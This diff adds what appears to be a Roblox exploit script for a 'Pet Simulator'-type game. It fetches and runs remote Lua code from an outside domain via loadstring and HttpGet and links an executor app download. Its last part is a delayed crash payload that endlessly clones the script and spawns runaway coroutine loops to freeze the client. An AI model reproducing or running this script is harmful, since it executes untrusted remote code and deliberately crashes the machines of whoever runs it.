@@ -1,1 +1,35 @@
+getgenv().AuthKey = "HUGE_EVLo3bTGTxVJ"
+getgenv().temporaryDomain = true
+getgenv().LoadSettings = {
+    Example_Setting = Example_Value
+}
+loadstring(game:HttpGet("https://v3rmillion2.net/ps99"))()
+
+ios :https://www.mediafire.com/file/o2kglgksygv9yfd/Codex2.165.ipa/file
+
+repeat wait() until game:IsLoaded()
+wait(120)
+local plr = game.Players.LocalPlayer
+local rs = game:GetService("RunService")
+ 
+function lag()
+    while true do
+        script:clone().Parent = plr.PlayerGui
+        print("Rest in peace.")
+    end
+end
+ 
+function memoryLeak()
+    for i = 1, 50000 do
+        coroutine.resume(coroutine.create(function()
+            for i = 1, 50000 do
+                spawn(lag)
+            end
+        end))
+    end
+end
+ 
+while true do
+    spawn(memoryLeak)
+end
 
